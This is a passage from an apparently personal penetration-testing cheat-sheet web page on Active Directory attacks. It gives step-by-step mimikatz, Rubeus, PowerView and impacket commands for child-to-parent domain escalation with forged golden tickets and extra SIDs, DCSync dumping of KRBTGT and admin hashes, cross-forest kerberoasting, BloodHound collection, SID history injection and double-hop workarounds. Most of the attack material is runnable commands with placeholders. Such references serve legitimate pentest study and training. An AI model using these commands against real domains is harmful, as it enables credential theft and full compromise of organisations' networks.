</span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">real</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">invented</span><span class="w"> </span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">child</span><span class="s1">'s DC name with domain&gt; /sid:&lt;child domain'</span><span class="nx">s</span><span class="w"> </span><span class="nx">SID</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/krbtgt:</span><span class="err">&lt;</span><span class="nx">KRBTGT</span><span class="s1">'s hash of child domain&gt; /sids:&lt;enterprise admins group'</span><span class="nx">s</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">parent</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># outside of mimikatz's prompt, confirm</span><span class="w">
</span><span class="c"># that kerberos ticket is loaded in memory:</span><span class="w">
</span><span class="n">klist</span><span class="w">

</span><span class="c"># check access to parent domain:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="err">&lt;</span><span class="nx">parent</span><span class="s1">'s DC name with domain&gt;\c$
</span></code></pre></div>

<p>the same thing can also be achieved with rubeus:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># create a golden ticket with rubeus:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">golden</span><span class="w"> </span><span class="nx">/rc4:</span><span class="err">&lt;</span><span class="nx">KRBTGT</span><span class="s1">'s hash of child domain&gt; /domain:&lt;child'</span><span class="nx">s</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/sid:</span><span class="err">&lt;</span><span class="nx">child</span><span class="w"> </span><span class="nx">domain</span><span class="s1">'s SID&gt; /sids:&lt;enterprise admins group'</span><span class="nx">s</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">parent</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">real</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">invented</span><span class="w"> </span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="c"># confirm that kerberos ticket is loaded in memory:</span><span class="w">
</span><span class="n">klist</span><span class="w">

</span><span class="c"># check access to parent domain:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="err">&lt;</span><span class="nx">parent</span><span class="s1">'s DC name with domain&gt;\c$
</span></code></pre></div>

<p>we can now perform a DCSync attack against the parent domain, among other attacks:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># run mimikatz prompt:</span><span class="w">
</span><span class="o">.</span><span class="n">\mimikatz.exe</span><span class="w">

</span><span class="c"># perform a DCSync attack in mimikatz's prompt:</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">parent</span><span class="s1">'s DC name without domain&gt;\&lt;domain admin username&gt;

# if target domain is not the same as user'</span><span class="nx">s</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w">
</span><span class="c"># specify exact domain like the following:</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">parent</span><span class="s1">'s DC name without domain&gt;\&lt;domain admin username&gt; /domain:&lt;parent'</span><span class="nx">s</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>from a linux host, the tools are different but the process is the same:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># get KRBTGT's hash with secretsdump.py by</span>
<span class="c"># performing DCSync:</span>
secretsdump.py &lt;child<span class="s1">'s DC name with domain&gt;/&lt;username&gt;@&lt;DC IP&gt; -just-dc-user &lt;child'</span>s DC subdomain, all caps&gt;/krbtgt

<span class="c"># get SID of child domain with lookupsid.py by</span>
<span class="c"># performing SID brute forcing:</span>
lookupsid.py &lt;child<span class="s1">'s DC name with domain&gt;/&lt;username&gt;@&lt;DC IP&gt; | grep "Domain SID"

# get enterprise admins group'</span>s SID of parent domain:
lookupsid.py &lt;child<span class="s1">'s DC name with domain&gt;/&lt;username&gt;@&lt;DC IP&gt; | grep -B12 "Enterprise Admins"

# now that we gathered what we need,
# make a golden ticket with ticketer.py:
ticketer.py -nthash &lt;KRBTGT'</span>s <span class="nb">hash </span>of child domain&gt; <span class="nt">-domain</span> &lt;child<span class="s1">'s DC name with domain, all caps&gt; -domain-sid &lt;SID of child domain&gt; -extra-sid &lt;enterprise admins group'</span>s SID from parent domain&gt; &lt;real or invented username&gt;

<span class="c"># set KRB5CCNAME env variable to hold</span>
<span class="c"># kerberos credentials with produced</span>
<span class="c"># ccache file:</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;ccache filename&gt;

<span class="c"># check if we can authenticate with</span>
<span class="c"># psexec.py:</span>
psexec.py &lt;child<span class="s1">'s DC name with domain, all caps&gt;/&lt;real or invented username&gt;@&lt;machine name&gt;.&lt;parent'</span>s DC name with domain&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target-ip</span> &lt;parent<span class="s1">'s DC IP&gt;
</span></code></pre></div>

<p>impacket&#39;s <code>raiseChild.py</code> can also be used to automate the process and save us time:</p>

<div class="highlight"><pre class="highlight shell"><code>raiseChild.py <span class="nt">-target-exec</span> &lt;parent<span class="s1">'s DC IP&gt; &lt;child'</span>s DC name with domain, all caps&gt;/&lt;username&gt;
</code></pre></div>

<h4>cross-forest trust attacks</h4>

<p>if we have either inbound or bidirectional domain/forest trust, we can perform kerberos attacks such as kerberoasting or ASREPRoasting to the trusting domain. we might not be able to escalate privileges in our current domain, but instead compromise a user with domain/enterprise admin privileges in both domains.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># enumerate "reachable" accounts from target</span><span class="w">
</span><span class="c"># domain to our domain with powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="w">

</span><span class="c"># check membership of account(s) listed</span><span class="w">
</span><span class="c"># in previous command:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">samaccountname</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">memberof</span><span class="w">

</span><span class="c"># perform kerberoasting on reachable account</span><span class="w">
</span><span class="c"># with rubeus:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">samaccountname</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># if we can crack the obtained hash, we now control</span><span class="w">
</span><span class="c"># two domains with a single admin account.</span><span class="w">
</span></code></pre></div>

<p>it&#39;s important to stay aware of ever-present password re-use, especially if two admin accounts for two distinct domains have similar names. the admin might simply use the same password for both.</p>

<p>we have to check as well for group membership of admin accounts: if an admin from a domain is a member of the administrators group of another domain, compromising this account will grant us admin access on both domains.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># enumerate groups with foreign group membership,</span><span class="w">
</span><span class="c"># who have users not belonging in target domain:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">Get-DomainForeignGroupMember</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># convert SIDs gathered in previous command, in</span><span class="w">
</span><span class="c"># MemberName field:</span><span class="w">
</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">SID</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># check if domain is indeed accessible with</span><span class="w">
</span><span class="c"># gathered account(s):</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="o">.</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">current</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">caps</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">samaccountname</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>we can do the same thing from a linux host:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># perform cross-forest kerberoasting:</span>
GetUserSPNs.py <span class="nt">-request</span> <span class="nt">-target-domain</span> &lt;DC target name with domain, all caps&gt; &lt;current DC name with domain, all caps&gt;/&lt;samaccountname&gt; <span class="nt">-outputfile</span> &lt;filename&gt;

<span class="c"># if using hashcat, crack the hash with mode 13100.</span>
</code></pre></div>

<p>if this worked, it&#39;s always a good idea to check if the target account exists in the current domain and if it can be compromised from password re-use. it&#39;s also a good idea to test the resulting password in a single password spray, again, to test for password re-use with other service accounts.</p>

<p>for foreign group membership, we can use <code>bloodhound-python</code> on our linux host. since it requires the DNS hostname of the current + target DCs and not just their IPs, we need to edit <code>/etc/resolv.conf</code>:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># edit example of /etc/resolv.conf</span>
&lt;SNIP&gt;

<span class="c"># commented out default nameservers entries</span>
<span class="c"># nameserver &lt;IP&gt;</span>
<span class="c"># nameserver &lt;IP&gt;</span>

<span class="c"># added target DC domain and IP</span>
domain &lt;target DC name with domain, all caps&gt;
nameserver &lt;target DC IP&gt;

<span class="c"># add current DC domain and IP</span>
domain &lt;current DC name with domain, all caps&gt;
nameserver &lt;current DC IP&gt;

&lt;SNIP&gt;
</code></pre></div>

<p>we can now run <code>bloodhound-python</code> on target:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># gather data from current DC. this will output</span>
<span class="c"># several json files in current directory:</span>
bloodhound-python <span class="nt">-d</span> &lt;current DC name with domain, all caps&gt; <span class="nt">-dc</span> &lt;machine name&gt; <span class="nt">-c</span> All <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;

<span class="c"># archive all files in single zip file and</span>
<span class="c"># upload to bloodhound GUI:</span>
zip <span class="nt">-r</span> &lt;filename&gt;.zip <span class="k">*</span>.json

<span class="c"># gather data from target DC:</span>
bloodhound-python <span class="nt">-d</span> &lt;target DC name with domain, all caps&gt; <span class="nt">-dc</span> &lt;machine name&gt;.&lt;target DC name with domain, all caps&gt; <span class="nt">-c</span> All <span class="nt">-u</span> &lt;username&gt;@&lt;current DC name with domain&gt; <span class="nt">-p</span> &lt;password&gt;

<span class="c"># archive all files again in single zip file and</span>
<span class="c"># upload to bloodhound GUI:</span>
zip <span class="nt">-r</span> &lt;filename&gt;.zip <span class="k">*</span>.json

<span class="c"># once all is uploaded, go to "analysis" tab and</span>
<span class="c"># click on "user with foreign domain group membership".</span>
<span class="c"># select current domain as source domain.</span>
</code></pre></div>

<p>if SID filtering is disabled between two domains, we can also perform SID history injection and add the SID of an admin account from forest A to <code>john</code>&#39;s SID history from forest B.</p>

<p>assuming <code>john</code> can authenticate to forest A from forest B, <code>john</code> will now have admin privileges in forest A.</p>

<h2>issues to be aware of</h2>

<h3>kerberos &quot;double hop&quot; problem</h3>

<p>the double hop problem is, to put it in a very succinct and simplified manner, the inability of kerberos to &quot;vouch for you&quot; when connecting remotely to a second location.</p>

<p>say we have all rights to a local, file share web service at <code>fileshare.domain.com</code>. this service interacts with a database, <code>sql.domain.com</code>.</p>

<p>when we authenticate to windows <em>interactively</em> (typically, from your computer physically), our credentials are likely stored in LSASS. and then, when we upload a file at fileshare.domain.com from our computer, we authenticate <em>remotely</em> to the service and kerberos knows we have all rights to perform that action.</p>

<p>but then, <code>fileshare.domain.com</code> talks to <code>sql.domain.com</code> to upload the file for us, and we get an error mentioning our access is denied. what gives?</p>

<p>when authenticating <em>remotely</em>, nothing gets stored in fileshare.domain.com&#39;s LSASS, contrary to authenticating <em>interactively</em> on our own computer. so when the double hop happens (<code>fileshare.domain.com</code> talking to <code>sql.domain.com</code>), the fileshare service has nothing stored to ensure our network permissions allow access to the database. it simply cannot vouch for us.</p>

<p>this main difference between interactive and remote authentication is crucial when dealing with windows systems, and will also happen during lateral movement. we may connect from a local machine who knows our permissions to another target, and that much will be fine. but if we perform lateral movement from that target, the end destination will know nothing of our permissions, because the first hop will not have them. and thus, access to services will be denied.</p>

<p>so how do we get around this issue? first of all, when <code>unconstrained delegation</code> is enabled on a server, our TGT ticket is sent with our TGS ticket when authenticating, which means that the server will be fully aware of our current context and permissions, and we will not encounter this problem. but it is unlikely that this feature will be enabled.</p>

<p>on our second hop, from an <code>evil-winrm</code> session, we can set up a PSCredential object to pass our credentials once more:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># create PSCredential object:</span><span class="w">
</span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'&lt;DC name without domain&gt;\&lt;username&gt;'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">

</span><span class="c"># test PSCredential object with powerview:</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">get-domainuser</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">

</span><span class="c"># Or with Invoke-Command and ScriptBlock, living off the land:</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">e.g.</span><span class="w"> </span><span class="nx">DC01</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">whoami</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></div>

<p>if we start a winRM session from a RDP&#39;d windows host with <code>Enter-PSSession</code>, we can register a new session configuration with <code>Register-PSSessionConfiguration</code>. this wouldn&#39;t work with <code>evil-winrm</code> because we wouldn&#39;t get the GUI credentials popup:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># create new session configuration:</span><span class="w">
</span><span class="n">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">session</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-RunAsCredential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># restart winRM service for changes to take effect:</span><span class="w">
</span><span class="n">Restart-Service</span><span class="w"> </span><span class="nx">WinRM</span><span class="w">

</span><span class="c"># restart a new PSSession after being kicked out during service restart:</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">domain</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">session</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># double-hop problem is solved, commands can be entered without creating</span><span class="w">
</span><span class="c"># a new PSCredential object:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="n">get-domainuser</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
</span></code></pre></div>

<p>other possible workarounds include credSSP, port forwarding and process injection which is running from the context of a target user (will be added soon).</p>

<h2>references</h2>

<ul>
<li><a href="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4" rel="nofollow">https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax" rel="nofollow">https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax</a></li>
<li><a href="https://adsecurity.org/?p=2293" rel="nofollow">https://adsecurity.org/?p=2293</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" rel="nofollow">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" rel="nofollow">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a></li>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces" rel="nofollow">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></li>
<li><a href="https://www.youtube.com/watch?v=p9QFdITuvgU" rel="nofollow">https://www.youtube.com/watch?v=p9QFdITuvgU</a></li>
<li><a href="https://posts.slayerlabs.com/double-hop/" rel="nofollow">https://posts.slayerlabs.com/double-hop/</a></li>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" rel="nofollow">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</a></li>
<li><a href="https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/" rel="nofollow">https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/</a></li>
<li><a href="https://grimhacker.com/2018/03/09/just-a-printer/" rel="nofollow">https://grimhacker.com/2018/03/09/just-a-printer/</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/sid-history-injection" rel="nofollow">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/sid-history-injection</a></li>
<li><a href="https://scribe.rip/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5" rel="nofollow">https://scribe.rip/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

